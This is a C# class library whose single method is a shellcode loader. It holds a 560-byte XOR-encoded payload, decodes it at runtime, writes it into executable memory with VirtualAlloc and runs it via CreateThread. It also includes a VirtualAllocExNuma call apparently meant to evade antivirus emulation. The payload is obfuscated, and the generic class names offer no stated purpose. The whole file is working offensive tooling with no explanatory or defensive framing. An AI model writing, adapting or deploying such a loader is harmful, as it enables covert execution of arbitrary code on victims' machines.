﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        public static void runner()
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[560] {
0x41, 0x8d, 0xf1, 0xf9, 0xf5, 0x1a, 0x65, 0x56, 0x04, 0xdf, 0x57, 0xfd, 0xf3, 0xf9, 0xf4, 0x20, 0xac, 0x9a, 0xad, 0xe2, 0x55, 0x6d, 0xe2, 0x55, 0x6c, 0xcc, 0x2b, 0x95, 0xf6, 0xe3, 0xde, 0xad, 0x2a, 0x94, 0x65, 0xdf, 0x40, 0x41, 0x4c, 0x55, 0x4b, 0x42, 0x7e, 0x55, 0x55, 0x55, 0xb9, 0x65, 0x45, 0xf1, 0x3a, 0x5d, 0x49, 0x51, 0x75, 0xb9, 0xb9, 0xb9, 0xf8, 0xe8, 0xf8, 0xe9, 0xeb, 0xe8, 0xf1, 0x88, 0x6b, 0xdc, 0xf1, 0x32, 0xeb, 0xd9, 0xf1, 0x32, 0xeb, 0xa1, 0xef, 0xf1, 0x32, 0xeb, 0x99, 0xf4, 0x88, 0x70, 0xf1, 0x32, 0xcb, 0xe9, 0xf1, 0xb6, 0x0e, 0xf3, 0xf3, 0xf1, 0x88, 0x79, 0x15, 0x85, 0xd8, 0xc5, 0xbb, 0x95, 0x99, 0xf8, 0x78, 0x70, 0xb4, 0xf8, 0xb8, 0x78, 0x5b, 0x54, 0xeb, 0xf1, 0x32, 0xeb, 0x99, 0xf8, 0xe8, 0x32, 0xfb, 0x85, 0xf1, 0xb8, 0x69, 0xdf, 0x38, 0xc1, 0xa1, 0xb2, 0xbb, 0xb6, 0x3c, 0xcb, 0xb9, 0xb9, 0xb9, 0x32, 0x39, 0x31, 0xb9, 0xb9, 0xb9, 0xf1, 0x3c, 0x79, 0xcd, 0xde, 0xf1, 0xb8, 0x69, 0xfd, 0x32, 0xf9, 0x99, 0x32, 0xf1, 0xa1, 0xf0, 0xb8, 0x69, 0xe9, 0x5a, 0xef, 0xf1, 0x46, 0x70, 0xf8, 0x32, 0x8d, 0x31, 0xf4, 0x88, 0x70, 0xf1, 0xb8, 0x6f, 0xf1, 0x88, 0x79, 0xf8, 0x78, 0x70, 0xb4, 0x15, 0xf8, 0xb8, 0x78, 0x81, 0x59, 0xcc, 0x48, 0xf5, 0xba, 0xf5, 0x9d, 0xb1, 0xfc, 0x80, 0x68, 0xcc, 0x61, 0xe1, 0xfd, 0x32, 0xf9, 0x9d, 0xf0, 0xb8, 0x69, 0xdf, 0xf8, 0x32, 0xb5, 0xf1, 0xfd, 0x32, 0xf9, 0xa5, 0xf0, 0xb8, 0x69, 0xf8, 0x32, 0xbd, 0x31, 0xf1, 0xb8, 0x69, 0xf8, 0xe1, 0xf8, 0xe1, 0xe7, 0xe0, 0xe3, 0xf8, 0xe1, 0xf8, 0xe0, 0xf8, 0xe3, 0xf1, 0x3a, 0x55, 0x99, 0xf8, 0xeb, 0x46, 0x59, 0xe1, 0xf8, 0xe0, 0xe3, 0xf1, 0x32, 0xab, 0x50, 0xf2, 0x46, 0x46, 0x46, 0xe4, 0xf0, 0x07, 0xce, 0xca, 0x8b, 0xe6, 0x8a, 0x8b, 0xb9, 0xb9, 0xf8, 0xef, 0xf0, 0x30, 0x5f, 0xf1, 0x38, 0x55, 0x19, 0xb8, 0xb9, 0xb9, 0xf0, 0x30, 0x5c, 0xf0, 0x05, 0xbb, 0xb9, 0xb9, 0x8c, 0x79, 0x11, 0xb8, 0x67, 0xf8, 0xed, 0xf0, 0x30, 0x5d, 0xf5, 0x30, 0x48, 0xf8, 0x03, 0xf5, 0xce, 0x9f, 0xbe, 0x46, 0x6c, 0xf5, 0x30, 0x53, 0xd1, 0xb8, 0xb8, 0xb9, 0xb9, 0xe0, 0xf8, 0x03, 0x90, 0x39, 0xd2, 0xb9, 0x46, 0x6c, 0xd3, 0xb3, 0xf8, 0xe7, 0xe9, 0xe9, 0xf4, 0x88, 0x70, 0xf4, 0x88, 0x79, 0xf1, 0x46, 0x79, 0xf1, 0x30, 0x7b, 0xf1, 0x46, 0x79, 0xf1, 0x30, 0x78, 0xf8, 0x03, 0x53, 0xb6, 0x66, 0x59, 0x46, 0x6c, 0xf1, 0x30, 0x7e, 0xd3, 0xa9, 0xf8, 0xe1, 0xf5, 0x30, 0x5b, 0xf1, 0x30, 0x40, 0xf8, 0x03, 0x20, 0x1c, 0xcd, 0xd8, 0x46, 0x6c, 0x3c, 0x79, 0xcd, 0xb3, 0xf0, 0x46, 0x77, 0xcc, 0x5c, 0x51, 0x2a, 0xb9, 0xb9, 0xb9, 0xf1, 0x3a, 0x55, 0xa9, 0xf1, 0x30, 0x5b, 0xf4, 0x88, 0x70, 0xd3, 0xbd, 0xf8, 0xe1, 0xf1, 0x30, 0x40, 0xf8, 0x03, 0xbb, 0x60, 0x71, 0xe6, 0x46, 0x6c, 0x3a, 0x41, 0xb9, 0xc7, 0xec, 0xf1, 0x3a, 0x7d, 0x99, 0xe7, 0x30, 0x4f, 0xd3, 0xf9, 0xf8, 0xe0, 0xd1, 0xb9, 0xa9, 0xb9, 0xb9, 0xf8, 0xe1, 0xf1, 0x30, 0x4b, 0xf1, 0x88, 0x70, 0xf8, 0x03, 0xe1, 0x1d, 0xea, 0x5c, 0x46, 0x6c, 0xf1, 0x30, 0x7a, 0xf0, 0x30, 0x7e, 0xf4, 0x88, 0x70, 0xf0, 0x30, 0x49, 0xf1, 0x30, 0x63, 0xf1, 0x30, 0x40, 0xf8, 0x03, 0xbb, 0x60, 0x71, 0xe6, 0x46, 0x6c, 0x3a, 0x41, 0xb9, 0xc4, 0x91, 0xe1, 0xf8, 0xee, 0xe0, 0xd1, 0xb9, 0xf9, 0xb9, 0xb9, 0xf8, 0xe1, 0xd3, 0xb9, 0xe3, 0xf8, 0x03, 0xb2, 0x96, 0xb6, 0x89, 0x46, 0x6c, 0xee, 0xe0, 0xf8, 0x03, 0xcc, 0xd7, 0xf4, 0xd8, 0x46, 0x6c, 0xf0, 0x46, 0x77, 0x50, 0x85, 0x46, 0x46, 0x46, 0xf1, 0xb8, 0x7a, 0xf1, 0x90, 0x7f, 0xf1, 0x3c, 0x4f, 0xcc, 0x0d, 0xf8, 0x46, 0x5e, 0xe1, 0xd3, 0xb9, 0xe0, 0xf0, 0x7e, 0x7b, 0x49, 0x0c, 0x1b, 0xef, 0x46, 0x6c, 0xf6, 0xe3};

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
